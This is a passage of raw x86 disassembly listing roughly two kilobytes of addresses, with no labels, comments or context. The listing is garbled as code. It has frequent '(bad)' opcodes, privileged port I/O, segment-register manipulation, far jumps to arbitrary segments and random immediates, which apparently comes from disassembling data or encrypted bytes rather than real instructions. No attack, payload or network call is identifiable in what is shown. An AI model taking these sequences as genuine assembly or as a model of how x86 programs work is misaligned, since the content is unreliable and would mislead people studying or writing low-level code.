  401812:	popa   
  401813:	out    dx,eax
  401814:	push   ecx
  401815:	and    al,0xfb
  401817:	shl    BYTE PTR [ebx+0x48],0x5c
  40181b:	push   ebx
  40181c:	and    esp,DWORD PTR [eax+0xe1c892e]
  401822:	mov    bl,0xc2
  401824:	inc    ebp
  401825:	cld    
  401826:	mov    cl,0xce
  401828:	sub    eax,0x4caf2f86
  40182d:	or     esp,DWORD PTR [eax]
  40182f:	mov    edi,0x2fda846f
  401834:	jae    0x40182b
  401836:	sti    
  401837:	pop    ds
  401838:	dec    ebx
  401839:	daa    
  40183a:	enter  0x9a35,0xd1
  40183e:	push   0xffffffb7
  401840:	rep lods al,BYTE PTR ds:[esi]
  401842:	out    dx,eax
  401843:	inc    esp
  401844:	jg     0x40181e
  401846:	mov    esp,0xf0c4e654
  40184b:	loopne 0x4018bd
  40184d:	js     0x401807
  40184f:	addr16 mov bl,0xb0
  401852:	arpl   WORD PTR [ecx],cx
  401854:	push   cs
  401855:	jge    0x4017ed
  401857:	ins    DWORD PTR es:[edi],dx
  401858:	mov    dl,0x1f
  40185a:	pop    es
  40185b:	fcomp  DWORD PTR [eax]
  40185d:	adc    DWORD PTR [edi+0x1cd19ed0],esi
  401863:	xchg   ebx,eax
  401864:	mov    DWORD PTR [esi+esi*2-0x8],esp
  401868:	int3   
  401869:	nop
  40186a:	lea    esp,[edi-0xed5c11]
  401870:	into   
  401871:	mov    esi,0x4c9b1236
  401876:	mov    cl,0x32
  401878:	jo     0x40188d
  40187a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40187b:	xor    cl,bl
  40187d:	jo     0x4018c5
  40187f:	shl    BYTE PTR [ebx],cl
  401881:	sub    al,0xc6
  401883:	push   esp
  401884:	jo     0x401809
  401886:	jo     0x401813
  401888:	mov    ebp,0xaaf55925
  40188d:	fwait
  40188e:	mov    dl,0xc0
  401890:	repz mov ebp,0xad1a3f37
  401896:	icebp  
  401897:	mov    ebp,0x98220248
  40189c:	xor    eax,DWORD PTR [ebp+0x3b]
  40189f:	sbb    cl,BYTE PTR [eax]
  4018a1:	push   ds
  4018a2:	jg     0x401888
  4018a4:	(bad)  [ebx-0x5c]
  4018a7:	sub    BYTE PTR [ecx],0xe6
  4018aa:	and    al,ch
  4018ac:	scas   al,BYTE PTR es:[edi]
  4018ad:	sub    bh,BYTE PTR [edx+edi*8]
  4018b0:	or     ebx,DWORD PTR es:[ecx+0x24c4fc6]
  4018b7:	lock xlat BYTE PTR ds:[ebx]
  4018b9:	out    0xaf,al
  4018bb:	cmp    edi,edx
  4018bd:	gs pop esi
  4018bf:	pop    ss
  4018c0:	outs   dx,DWORD PTR ds:[esi]
  4018c1:	sbb    ebx,DWORD PTR [esi+0x232d221c]
  4018c7:	sbb    BYTE PTR [edi],0xed
  4018ca:	aad    0xc9
  4018cc:	pop    eax
  4018cd:	inc    eax
  4018ce:	xor    DWORD PTR ds:0xe3e1b871,esp
  4018d4:	xor    al,0xa0
  4018d6:	frstor [ebp+0x6c]
  4018d9:	and    eax,0xf986ced3
  4018de:	addr16 pop edi
  4018e0:	sbb    al,0xa0
  4018e2:	adc    al,0x78
  4018e4:	adc    ebx,DWORD PTR [ebp-0x6c]
  4018e7:	gs mov al,0x24
  4018ea:	fnstenv [ebx+0x61]
  4018ed:	xor    dl,BYTE PTR [ebp+0x47]
  4018f0:	push   esp
  4018f1:	hlt    
  4018f2:	fstp   QWORD PTR [edx+0x490dc81]
  4018f8:	jl     0x401974
  4018fa:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4018fb:	mov    ebp,0x7c31b168
  401900:	mov    edi,DWORD PTR [edi+0x541265cf]
  401906:	mov    ebp,0x9b6c4d1a
  40190b:	cmp    dh,BYTE PTR [edi+0xebf68fe]
  401911:	jg     0x40195d
  401913:	aas    
  401914:	popa   
  401915:	pop    edi
  401916:	je     0x401990
  401918:	aaa    
  401919:	adc    eax,0xa389c67b
  40191e:	dec    edi
  40191f:	stos   BYTE PTR es:[edi],al
  401920:	out    dx,eax
  401921:	cmp    eax,0x9f360fdc
  401926:	xchg   edi,eax
  401927:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  401928:	inc    eax
  401929:	repnz in eax,0x3f
  40192c:	call   0x2cf2:0x69b75ddb
  401933:	bound  ebp,QWORD PTR [ebx-0x122cf756]
  401939:	leave  
  40193a:	clc    
  40193b:	mov    ch,0xed
  40193d:	sahf   
  40193e:	stos   DWORD PTR es:[edi],eax
  40193f:	push   eax
  401940:	mov    ah,0xef
  401942:	xchg   ebp,eax
  401943:	mov    dl,0x9e
  401945:	pop    ds
  401946:	pop    esi
  401947:	sub    ebx,ecx
  401949:	dec    eax
  40194a:	mov    eax,ds:0xbd461134
  40194f:	fwait
  401950:	push   cs
  401951:	stos   BYTE PTR es:[edi],al
  401952:	sahf   
  401953:	inc    edi
  401954:	fisubr WORD PTR [esi-0x74850a55]
  40195a:	push   esi
  40195b:	loop   0x40194d
  40195d:	aad    0x37
  40195f:	jle    0x401978
  401961:	jmp    0x7efe:0x7fe9bcd4
  401968:	sub    eax,eax
  40196a:	push   ecx
  40196b:	push   eax
  40196c:	adc    cl,ah
  40196e:	or     eax,0xca32d65f
  401973:	mov    dl,0xfc
  401975:	dec    ecx
  401976:	arpl   bx,ax
  401978:	pusha  
  401979:	fisub  DWORD PTR [esi+eax*1+0x76]
  40197d:	mov    DWORD PTR [ecx-0x2c172c38],ebx
  401983:	imul   DWORD PTR [ebx]
  401985:	aam    0x81
  401987:	dec    ebp
  401988:	xchg   esi,eax
  401989:	enter  0x863d,0x56
  40198d:	jnp    0x4019c3
  40198f:	xor    BYTE PTR [edx+eiz*8],0x83
  401993:	stos   DWORD PTR es:[edi],eax
  401994:	outs   dx,BYTE PTR ds:[esi]
  401995:	mov    dh,0xb7
  401997:	gs mov ah,0x3d
  40199a:	ss gs add ax,0xf304
  4019a0:	ja     0x401a03
  4019a2:	(bad)  
  4019a3:	jl     0x40197b
  4019a5:	ja     0x401930
  4019a7:	imul   esi,ebp,0xffffffeb
  4019aa:	mov    eax,ds:0x46f4dcae
  4019af:	outs   dx,DWORD PTR ds:[esi]
  4019b0:	into   
  4019b1:	jecxz  0x40199e
  4019b3:	dec    esp
  4019b4:	stos   DWORD PTR es:[edi],eax
  4019b5:	add    ecx,0xe1a46822
  4019bb:	mov    ds:0x1723e121,al
  4019c0:	in     al,dx
  4019c1:	mov    dl,0x38
  4019c3:	test   al,0x18
  4019c5:	mov    WORD PTR [edx-0x2f493f52],fs
  4019cb:	push   ss
  4019cc:	and    al,0x2b
  4019ce:	dec    esi
  4019cf:	lods   eax,DWORD PTR ds:[esi]
  4019d0:	stos   BYTE PTR es:[edi],al
  4019d1:	ret    0x7f10
  4019d4:	lahf   
  4019d5:	or     ch,BYTE PTR ds:0x58dc93f1
  4019db:	sbb    BYTE PTR [ebp-0x6e5739f1],bl
  4019e1:	int3   
  4019e2:	je     0x4019e8
  4019e4:	ss (bad) 
  4019e6:	inc    edi
  4019e7:	push   0x774ee81e
  4019ec:	rcl    DWORD PTR [ecx+esi*8-0x5290fc69],0x2e
  4019f4:	pop    eax
  4019f5:	dec    esp
  4019f6:	mov    edx,esi
  4019f8:	or     bl,BYTE PTR [ecx+0x21]
  4019fb:	or     DWORD PTR [ecx],0x9bdac0dd
  401a01:	jmp    0xe91133a9
  401a06:	mov    dh,dh
  401a08:	aad    0x55
  401a0a:	jecxz  0x401a55
  401a0c:	mov    ss,WORD PTR [esi-0x6273374d]
  401a12:	inc    edi
  401a13:	sahf   
  401a14:	inc    eax
  401a15:	ins    DWORD PTR es:[edi],dx
  401a16:	xchg   esp,eax
  401a17:	jp     0x401a32
  401a19:	bound  ebx,QWORD PTR [edx-0x3ad2c49c]
  401a1f:	dec    esi
  401a20:	mov    ch,0xdd
  401a22:	rcr    DWORD PTR ds:0xd54368dc,0x37
  401a29:	icebp  
  401a2a:	int3   
  401a2b:	mov    edx,0xb3b714ff
  401a30:	mov    ecx,0x4f49b0a8
  401a35:	xor    bh,BYTE PTR [edi+0x65410734]
  401a3b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  401a3c:	cld    
  401a3d:	or     al,0x41
  401a3f:	mov    esi,0x1e147d76
  401a44:	test   DWORD PTR ds:0xa513ece6,edx
  401a4a:	int    0xa3
  401a4c:	and    esi,DWORD PTR [esi+esi*4-0x1c8cdc96]
  401a53:	mov    es,WORD PTR ds:0x165c9e51
  401a59:	mov    dl,0xd1
  401a5b:	hlt    
  401a5c:	shl    DWORD PTR [ecx],cl
  401a5e:	outs   dx,BYTE PTR ds:[esi]
  401a5f:	stc    
  401a60:	sbb    DWORD PTR [ebx-0x5d],ebp
  401a63:	lock ja 0x401a98
  401a66:	out    dx,al
  401a67:	dec    esp
  401a68:	fcmovne st,st(4)
  401a6a:	popf   
  401a6b:	mov    ah,BYTE PTR [esi]
  401a6d:	imul   ecx,DWORD PTR [ecx+0x111ba69c],0xe955fd5b
  401a77:	pop    ds
  401a78:	fstp   QWORD PTR [esp+ecx*4-0x685ac57]
  401a7f:	into   
  401a80:	inc    esp
  401a81:	cmp    BYTE PTR [esi],0xc4
  401a84:	dec    ecx
  401a85:	add    BYTE PTR [ebx],dh
  401a87:	mov    WORD PTR [edx-0x3],gs
  401a8a:	bound  ecx,QWORD PTR [eax+0x360f1efa]
  401a90:	inc    ecx
  401a91:	add    DWORD PTR [esi-0x424216a9],eax
  401a97:	fs fmulp st(2),st
  401a9a:	out    0xed,eax
  401a9c:	lds    esp,FWORD PTR [edi]
  401a9e:	mov    eax,0x4c12693d
  401aa3:	les    edi,FWORD PTR [ebx+0x52]
  401aa6:	adc    eax,0x4bf3d6ab
  401aab:	ins    DWORD PTR es:[edi],dx
  401aac:	aad    0x41
  401aae:	mov    bl,0xdb
  401ab0:	psrlq  mm7,mm6
  401ab3:	xchg   esp,eax
  401ab4:	mov    ecx,0x26288cd1
  401ab9:	(bad)  
  401aba:	push   edi
  401abb:	scas   al,BYTE PTR es:[edi]
  401abc:	sbb    ecx,DWORD PTR [esi+0x26]
  401abf:	test   ebp,esi
  401ac1:	lods   eax,DWORD PTR ds:[esi]
  401ac2:	call   0x96037b17
  401ac7:	jecxz  0x401b35
  401ac9:	ret    0xd35d
  401acc:	add    BYTE PTR [ebp+0x26],ah
  401acf:	out    dx,al
  401ad0:	jne    0x401b22
  401ad2:	push   edi
  401ad3:	(bad)  
  401ad4:	jp     0x401afb
  401ad6:	jnp    0x401aa0
  401ad8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  401ad9:	ja     0x401af4
  401adb:	inc    ebx
  401adc:	daa    
  401add:	rcl    BYTE PTR [eax+0x3c481b0f],0xf7
  401ae4:	mov    ecx,0x2371086
  401ae9:	inc    ebx
  401aea:	fistp  WORD PTR [esi+0x7c00032e]
  401af0:	test   eax,0x8358071d
  401af5:	dec    eax
  401af6:	mov    ebx,0x44517086
  401afb:	jo     0x401b20
  401afd:	mov    edi,0xf34f7797
  401b02:	cld    
  401b03:	out    0xb8,eax
  401b05:	dec    esi
  401b06:	inc    eax
  401b07:	pop    ds
  401b08:	icebp  
  401b09:	xchg   ebp,eax
  401b0a:	jo     0x401b52
  401b0c:	adc    BYTE PTR [edx+0x18],al
  401b0f:	mov    ah,BYTE PTR [eax+0x7c6cfe8b]
  401b15:	ins    DWORD PTR es:[edi],dx
  401b16:	cmp    ebx,DWORD PTR [ecx-0x5f]
  401b19:	inc    eax
  401b1a:	int3   
  401b1b:	add    ebx,DWORD PTR [edi+esi*2-0x40fe6]
  401b22:	and    eax,0x847ea0d6
  401b27:	or     bh,BYTE PTR [eax]
  401b29:	pop    ebp
  401b2a:	dec    esi
  401b2b:	test   al,0x64
  401b2d:	ins    BYTE PTR es:[edi],dx
  401b2e:	loope  0x401b98
  401b30:	cmp    al,0xc6
  401b32:	fmul   QWORD PTR [ebx+0x7c440dc7]
  401b38:	in     eax,dx
  401b39:	into   
  401b3a:	shr    DWORD PTR [ecx-0x8],0x8d
  401b3e:	and    DWORD PTR [esi-0x1d460759],ebp
  401b44:	inc    ebx
  401b45:	xchg   ecx,eax
  401b46:	push   ecx
  401b47:	xchg   esi,eax
  401b48:	push   edi
  401b49:	pop    esi
  401b4a:	pop    eax
  401b4b:	push   edi
  401b4c:	mov    esi,0xa4848cb0
  401b51:	jge    0x401b36
  401b53:	or     DWORD PTR [ebx-0x3af7f791],edi
  401b59:	mov    dl,0x7f
  401b5b:	jmp    0xaf55:0x435849c3
  401b62:	js     0x401b5b
  401b64:	imul   eax,ecx,0x8aa98c8
  401b6a:	add    eax,0x67048d60
  401b6f:	adc    DWORD PTR [ebx-0x27],0x64
  401b73:	out    0xa,eax
  401b75:	mov    esp,0xf7aa81f7
  401b7a:	jo     0x401b9a
  401b7c:	sahf   
  401b7d:	or     ecx,ecx
  401b7f:	jle    0x401b4c
  401b81:	mov    bl,0x4b
  401b83:	xrelease mov DWORD PTR [ebp-0x4c],esi
  401b87:	mov    esi,0x2c0cd530
  401b8c:	xor    DWORD PTR [ebx-0x30f7dded],esp
  401b92:	jle    0x401ba4
  401b94:	mov    eax,ds:0x2393e36
  401b99:	pop    ecx
  401b9a:	dec    esi
  401b9b:	fidiv  DWORD PTR [ebp-0x784139de]
  401ba1:	jge    0x401bc8
  401ba3:	rcl    DWORD PTR [esi],0x2f
  401ba6:	xor    al,0x64
  401ba8:	jp     0x401bb9
  401baa:	rcr    DWORD PTR [edi+0x38],cl
  401bad:	ret    
  401bae:	mov    ds:0x95c5fc4e,eax
  401bb3:	mov    edx,DWORD PTR [eax+eax*4]
  401bb6:	mov    esp,0xdae2e505
  401bbb:	lahf   
  401bbc:	sti    
  401bbd:	leave  
  401bbe:	mov    es,WORD PTR [esi-0x2e1fb598]
  401bc4:	sti    
  401bc5:	mov    ecx,0x436bac0c
  401bca:	dec    esp
  401bcb:	test   BYTE PTR [ebx+ebp*4+0x18],al
  401bcf:	mov    ds:0x64ec9fc9,al
  401bd4:	adc    al,0x12
  401bd6:	hlt    
  401bd7:	pop    edi
  401bd8:	mov    WORD PTR [esi],?
  401bda:	xor    al,0xa9
  401bdc:	jmp    0x7a47f09a
  401be1:	sbb    BYTE PTR [ebx+0x29],0xd4
  401be5:	cmp    al,0xa
  401be7:	and    al,0x6b
  401be9:	add    DWORD PTR [eax+0x49],ebp
  401bec:	push   0x25373fe3
  401bf1:	out    dx,eax
  401bf2:	out    dx,eax
  401bf3:	xor    dh,BYTE PTR [eax-0x16]
  401bf6:	call   0x5b96:0x3ddd42ec
  401bfd:	out    dx,eax
  401bfe:	and    ecx,DWORD PTR [ebx]
  401c00:	mov    esp,0xaa195709
  401c05:	(bad)
  401c08:	mov    ch,0x32
  401c0a:	dec    esp
  401c0b:	xchg   ecx,eax
  401c0c:	push   cs
  401c0d:	icebp  
  401c0e:	je     0x401c07
  401c10:	cmp    eax,esp
  401c12:	mov    dh,al
  401c14:	sbb    ch,BYTE PTR [ebp-0x59]
  401c17:	cmp    edx,DWORD PTR [ebx]
  401c19:	out    dx,eax
  401c1a:	mov    dl,BYTE PTR [ebp+0x7fc2098f]
  401c20:	es test eax,0x892f6b02
  401c26:	ds inc eax
  401c28:	adc    bl,ah
  401c2a:	xchg   esp,eax
  401c2b:	test   eax,0x904efc79
  401c30:	(bad)  
  401c31:	fild   QWORD PTR [edx]
  401c33:	xor    DWORD PTR [ebx-0xcef8a55],ebp
  401c39:	adc    al,0x4e
  401c3b:	mov    dl,bh
  401c3d:	ret    
  401c3e:	hlt    
  401c3f:	jo     0x401c70
  401c41:	out    0xb2,al
  401c43:	cmp    BYTE PTR [esi+0x58f26ad3],cl
  401c49:	and    BYTE PTR [ebx-0x2d945163],bl
  401c4f:	jnp    0x401c1a
  401c51:	adc    ebx,esi
  401c53:	mov    bh,0xb4
  401c55:	jg     0x401cb3
  401c57:	jmp    0x401c5f
  401c59:	pusha  
  401c5a:	push   ebp
  401c5b:	stc    
  401c5c:	cmp    eax,esp
  401c5e:	(bad)  
  401c5f:	cli    
  401c60:	ret    0x7d6b
  401c63:	dec    ebp
  401c64:	rol    DWORD PTR [ebp+0x3c00e06e],1
  401c6a:	mov    eax,0x6dd189ff
  401c6f:	es retf 0x6ef9
  401c73:	xchg   ebx,ebx
  401c75:	lods   al,BYTE PTR ds:[esi]
  401c76:	and    ah,BYTE PTR [edi-0x108736a3]
  401c7c:	pusha  
  401c7d:	fs sbb eax,0x1033e46d
  401c83:	mov    al,ds:0xf2ec00d8
  401c88:	repnz push edi
  401c8a:	daa    
  401c8b:	and    al,0x81
  401c8d:	or     eax,0xc3300adf
  401c92:	(bad)  
  401c93:	(bad)  
  401c94:	xor    DWORD PTR [ebp+0x11],edi
  401c97:	inc    eax
  401c98:	pop    ds
  401c99:	jle    0x401cfe
  401c9b:	out    dx,eax
  401c9c:	jle    0x401c3f
  401c9e:	rcr    BYTE PTR [ecx+edx*2-0x25],1
  401ca2:	sahf   
  401ca3:	test   eax,0x3fce7392
  401ca8:	fdiv   QWORD PTR [edx]
  401caa:	jge    0x401ce2
  401cac:	out    dx,al
  401cad:	and    ebx,edx
  401caf:	enter  0x5dd5,0x19
  401cb3:	out    dx,al
  401cb4:	mov    eax,0x386dccc9
  401cb9:	adc    eax,0x7f1fc44b
  401cbe:	pop    esp
  401cbf:	push   0xb4db32ea
  401cc4:	fld    QWORD PTR [eax-0x4c63bf49]
  401cca:	mov    edi,eax
  401ccc:	daa    
  401ccd:	adc    dh,ch
  401ccf:	push   ebx
  401cd0:	retf   
  401cd1:	or     dl,BYTE PTR [ebx-0x25ffcdb3]
  401cd7:	cmc    
  401cd8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  401cd9:	in     al,dx
  401cda:	dec    esp
  401cdb:	sbb    esi,DWORD PTR [edi-0xb963834]
  401ce1:	add    eax,0xbfbc7b31
  401ce6:	adc    BYTE PTR [esi-0x22e9ca77],ah
  401cec:	push   esp
  401ced:	sbb    BYTE PTR [ebx],al
  401cef:	outs   dx,BYTE PTR ds:[esi]
  401cf0:	push   ds
  401cf1:	js     0x401d47
  401cf3:	jp     0x401cd5
  401cf5:	pop    edx
  401cf6:	(bad)  
  401cf7:	in     eax,dx
  401cf8:	dec    eax
  401cf9:	ja     0x401cb3
  401cfb:	ja     0x401d78
  401cfd:	mov    edi,0x7df1bb40
  401d02:	sti    
  401d03:	js     0x401cb3
  401d05:	inc    edx
  401d06:	mov    eax,0xbd1ea7a3
  401d0b:	mov    ch,0xdd
  401d0d:	les    eax,FWORD PTR [edi-0x5]
  401d10:	pop    edi
  401d11:	cmp    DWORD PTR [edx+0x7a84fd63],edx
  401d17:	pop    ecx
  401d18:	jl     0x401d15
  401d1a:	stc    
  401d1b:	imul   eax,DWORD PTR [edx-0xb],0x49
  401d1f:	and    DWORD PTR [ecx+0x3b],0x31
  401d23:	imul   esi,DWORD PTR [ebp+0x7a],0x4e
  401d27:	push   0xed043664
  401d2c:	or     DWORD PTR [ebp-0xa3803fa],edx
  401d32:	xchg   esi,eax
  401d33:	cwde   
  401d34:	jle    0x401d4f
  401d36:	xchg   ecx,eax
  401d37:	push   ebx
  401d38:	stos   DWORD PTR es:[edi],eax
  401d39:	push   edx
  401d3a:	in     al,0x88
  401d3c:	imul   esp,esp,0xffffffb9
  401d3f:	jecxz  0x401d35
  401d41:	push   cs
  401d42:	mov    fs,WORD PTR [ecx+esi*8]
  401d45:	repz sub al,BYTE PTR [edi-0x6980df22]
  401d4c:	adc    DWORD PTR [ecx],ebx
  401d4e:	xchg   esi,eax
  401d4f:	xlat   BYTE PTR ds:[ebx]
  401d50:	sti    
  401d51:	test   DWORD PTR [ebx],ecx
  401d53:	sahf   
  401d54:	outs   dx,DWORD PTR ds:[esi]
  401d56:	mov    eax,0xa3f42fc
  401d5b:	adc    eax,ebx
  401d5d:	xchg   esp,eax
  401d5e:	jns    0x401db1
  401d60:	bound  eax,QWORD PTR [edi-0x30]
  401d63:	jns    0x401cf8
  401d65:	xchg   ecx,eax
  401d66:	out    0xc3,al
  401d68:	inc    eax
  401d69:	ror    DWORD PTR [esi-0x5c53ffe5],0x5a
  401d70:	xchg   ecx,eax
  401d71:	pop    esi
  401d72:	test   dl,al
  401d74:	shr    edi,cl
  401d76:	daa    
  401d77:	push   cs
  401d78:	cmp    eax,DWORD PTR [eax-0x54]
  401d7b:	fsincos 
  401d7d:	sub    eax,0xf33ea2c9
  401d82:	and    bh,BYTE PTR [esi+0x25f70945]
  401d88:	cmp    bl,BYTE PTR [esi]
  401d8a:	adc    ah,BYTE PTR [ecx-0xa46e87c]
  401d90:	in     eax,0x64
  401d92:	sahf   
  401d93:	cdq    
  401d94:	push   0xb32b8861
  401d99:	xchg   ecx,eax
  401d9a:	fisttp QWORD PTR ds:0xe7d879ca
  401da0:	xor    eax,0x65aaaec
  401da5:	add    cl,BYTE PTR [edx]
  401da7:	sub    al,0x94
  401da9:	or     eax,0x1b112cbb
  401dae:	(bad)
  401db1:	out    0x2b,eax
  401db3:	out    0x54,eax
  401db5:	sub    al,0x2f
  401db7:	pop    ebp
  401db8:	mov    eax,0x397ebc3b
  401dbd:	test   eax,0xae0b878a
  401dc2:	mov    ds:0xe62bee34,eax
  401dc7:	lds    eax,FWORD PTR [esi+0x1e]
  401dca:	fimul  WORD PTR [edx-0x17]
  401dcd:	cmp    eax,0xd5fa8e5a
  401dd2:	stc    
  401dd3:	clc    
  401dd4:	addr16 je 0x401dd9
  401dd7:	xlat   BYTE PTR ds:[ebx]
  401dd8:	in     al,dx
  401dd9:	pop    es
  401dda:	or     eax,0xdb98acf0
  401ddf:	fidivr WORD PTR [edx]
  401de1:	dec    edi
  401de2:	mov    ebp,0x44acbc33
  401de7:	adc    BYTE PTR [esi-0x50],bl
  401dea:	int3   
  401deb:	icebp  
  401dec:	mov    esp,0xec39adf8
  401df1:	std    
  401df2:	adc    bh,BYTE PTR [edx]
  401df4:	jae    0x401de0
  401df6:	mov    ds,WORD PTR [edx-0x5ec90a5a]
  401dfc:	dec    esi
  401dfd:	or     DWORD PTR [ecx-0x14],esi
  401e00:	stos   DWORD PTR es:[edi],eax
  401e01:	(bad)  
  401e02:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  401e03:	rcr    DWORD PTR [ecx],0x86
  401e06:	push   edi
  401e07:	xor    eax,0x96f35226
  401e0c:	loopne 0x401de1
  401e0e:	xchg   esi,eax
  401e0f:	aaa    
  401e10:	popa   
  401e11:	and    edx,ebp
  401e13:	and    BYTE PTR [eax-0x6],bh
  401e16:	loope  0x401dcf
  401e18:	data16 mov cl,0xff
  401e1b:	cmp    bl,BYTE PTR [esi-0x66]
  401e1e:	sub    DWORD PTR [ebx+0x965074a],esi
  401e24:	ins    BYTE PTR es:[edi],dx
  401e25:	not    DWORD PTR [ebp+0xc168d98]
  401e2b:	addr16 aam 0xb9
  401e2e:	iret   
  401e2f:	rol    dl,cl
  401e31:	pop    ss
  401e32:	sub    ah,bh
  401e34:	mov    al,0x92
  401e36:	or     eax,0xcd4a6263
  401e3b:	lock sbb al,BYTE PTR gs:[esi]
  401e3f:	imul   esi,DWORD PTR [edx+0x4c],0x4c7b7200
  401e46:	shl    ebp,cl
  401e48:	call   0x61317d27
  401e4d:	inc    ecx
  401e4e:	xchg   ebx,eax
  401e4f:	xor    BYTE PTR ds:[ebx+0x7d],ah
  401e53:	push   eax
  401e54:	xchg   ebx,eax
  401e55:	into   
  401e56:	mov    eax,0x54f167c6
  401e5b:	pop    edx
  401e5c:	mov    eax,ds:0xb5eedd2a
  401e61:	push   edi
  401e62:	stos   DWORD PTR es:[edi],eax
  401e63:	es lahf 
  401e65:	retf   
  401e66:	popf   
  401e67:	mov    edi,0xed93f38
  401e6c:	je     0x401edc
  401e6e:	clc    
  401e6f:	test   eax,0x8ff2bd99
  401e74:	xchg   esp,eax
  401e75:	mov    edi,0xe5706588
  401e7a:	ins    BYTE PTR es:[edi],dx
  401e7b:	jns    0x401e1c
  401e7d:	imul   bh
  401e7f:	ret    
  401e80:	ja     0x401e59
  401e82:	jmp    0xacaa:0x3188e29b
  401e89:	in     al,dx
  401e8a:	(bad)  
  401e8c:	mov    edi,0xb993e3db
  401e91:	ins    DWORD PTR es:[edi],dx
  401e92:	imul   eax,edx,0xffffff90
  401e95:	jbe    0x401e4f
  401e97:	mov    edi,0x6bc73a24
  401e9c:	pop    ebp
  401e9d:	cmc    
  401e9e:	or     BYTE PTR [edx+0x75],dh
  401ea1:	(bad)  
  401ea2:	fdivr  DWORD PTR [eax]
  401ea4:	in     eax,0x4a
  401ea6:	or     eax,0x7e08f31d
  401eab:	test   ch,dh
  401ead:	rol    ebx,cl
  401eaf:	inc    esi
  401eb0:	xchg   ecx,eax
  401eb1:	ss xchg esp,eax
  401eb3:	dec    esi
  401eb4:	hlt    
  401eb5:	dec    esp
  401eb6:	fcmovnbe st,st(3)
  401eb8:	addr16 pop ss
  401eba:	enter  0x3899,0x5e
  401ebe:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401ebf:	je     0x401e92
  401ec1:	sahf   
  401ec2:	test   ebx,edx
  401ec4:	(bad)  
  401ec5:	daa    
  401ec6:	in     eax,dx
  401ec7:	dec    ebp
  401ec8:	push   ecx
  401ec9:	repz pushf 
  401ecb:	jo     0x401f20
  401ecd:	je     0x401f01
  401ecf:	inc    ebx
  401ed0:	adc    al,0x29
  401ed2:	xor    BYTE PTR [edx],ch
  401ed4:	loope  0x401f01
  401ed6:	rol    esi,1
  401ed8:	jl     0x401ed9
  401eda:	and    BYTE PTR [ebx+0x42],al
  401edd:	dec    edx
  401ede:	(bad)  
  401edf:	test   DWORD PTR [ecx+0x66ea5b54],esp
  401ee5:	or     DWORD PTR [edx+esi*2],edi
  401ee8:	inc    ecx
  401ee9:	nop
  401eea:	pop    ecx
  401eeb:	jb     0x401f5e
  401eed:	inc    ebx
  401eee:	jne    0x401ed3
  401ef0:	cmp    bh,BYTE PTR [eax+0x3f868b64]
  401ef6:	in     al,0x76
  401ef8:	mov    ds:0xa1bcba04,eax
  401efd:	xchg   ebx,eax
  401efe:	aas    
  401eff:	jmp    0xd726:0x89569a5f
  401f06:	mov    ah,0x7c
  401f08:	fiadd  DWORD PTR [edx-0x2b13eda9]
  401f0e:	mov    BYTE PTR [esi+0x65a93650],dh
  401f14:	or     ecx,DWORD PTR [edi-0x40e8b7f5]
  401f1a:	fcomp  QWORD PTR [edx-0x21a14b32]
  401f20:	jmp    0x401eb6
  401f22:	xor    dl,BYTE PTR [ebx+0xf65b7d7]
  401f28:	inc    esi
  401f29:	sbb    eax,0x67c7524c
  401f2e:	or     DWORD PTR [edx+0x6c],0x54
  401f32:	sub    ebp,DWORD PTR ds:0xb4b44ee3
  401f38:	xchg   edi,eax
  401f39:	dec    esi
  401f3a:	test   al,0x3b
  401f3c:	add    eax,0x865d79d0
  401f41:	jge    0x401fbc
  401f43:	outs   dx,DWORD PTR ds:[esi]
  401f44:	rol    DWORD PTR [ecx-0x68e9a1ab],cl
  401f4a:	dec    esi
  401f4b:	xchg   ecx,eax
  401f4c:	xor    BYTE PTR [esi-0x5f9c3850],dh
  401f52:	push   ebp
  401f53:	push   0x32
  401f55:	cmp    al,0xcf
  401f57:	pop    esp
  401f58:	ds xchg ebp,eax
  401f5a:	push   cs
  401f5b:	std    
  401f5c:	rcr    BYTE PTR es:[ebx+0x3c3dc95a],cl
  401f63:	pop    edi
  401f64:	jae    0x401fd4
  401f66:	hlt    
  401f67:	inc    esi
  401f68:	mov    eax,ds:0xda853f4f
  401f6d:	push   ecx
  401f6e:	cld    
  401f6f:	pusha  
  401f70:	nop
  401f71:	cmp    al,0x7c
  401f73:	out    dx,eax
  401f74:	enter  0x4a86,0xc1
  401f78:	in     al,dx
  401f79:	dec    esi
  401f7a:	mov    ecx,0xbe9aa774
  401f7f:	pop    es
  401f80:	imul   edi,DWORD PTR [ecx],0xffffffe1
  401f83:	jmp    0xf300:0xf44cc49c
  401f8a:	shl    BYTE PTR [edi-0x17a4ce53],1
  401f90:	inc    ecx
  401f91:	cmp    al,0x91
  401f93:	pop    eax
  401f94:	ja     0x401fe6
  401f96:	pop    eax
  401f97:	movs   DWORD PTR es:[edi],DWORD PTR es:[esi]
  401f99:	and    esp,DWORD PTR [edx+0x55]
  401f9c:	aad    0x81
  401f9e:	sub    BYTE PTR [ecx],dh
  401fa0:	fs inc edx
  401fa2:	jg     0x401f3b
  401fa4:	hlt    
  401fa5:	ret    
  401fa6:	retf   
  401fa7:	xor    eax,esi
  401fa9:	push   ds
  401faa:	in     al,dx
  401fab:	retf   
  401fac:	popf   
  401fad:	lods   al,BYTE PTR ds:[esi]
  401fae:	sahf   
  401faf:	call   FWORD PTR [esp+edx*4-0x65e7499]
  401fb6:	stc    
  401fb7:	push   edi
  401fb8:	cmp    BYTE PTR [ecx],dl
  401fba:	mov    esp,0xaab8c692
  401fbf:	aam    0xce
  401fc1:	and    BYTE PTR [ecx-0x3264004f],ah
  401fc7:	in     al,dx
  401fc8:	jmp    0xe4cf6782
  401fcd:	ds js  0x40200d
  401fd0:	in     al,0xf1
  401fd2:	inc    eax
  401fd3:	test   eax,0x53feeff9
  401fd8:	inc    esp
  401fd9:	dec    edi
  401fda:	mov    ah,0xa
  401fdc:	inc    eax
  401fdd:	xchg   ecx,eax
  401fde:	and    BYTE PTR [ebx+0x5],ah
  401fe1:	imul   eax,DWORD PTR ds:0xc12ad699,0x9851607
  401feb:	mov    ebp,0xa800d7fc
  401ff0:	ret    
  401ff1:	or     BYTE PTR [edi+0xc],0xc6
  401ff5:	jl     0x401fa2
  401ff7:	sahf   
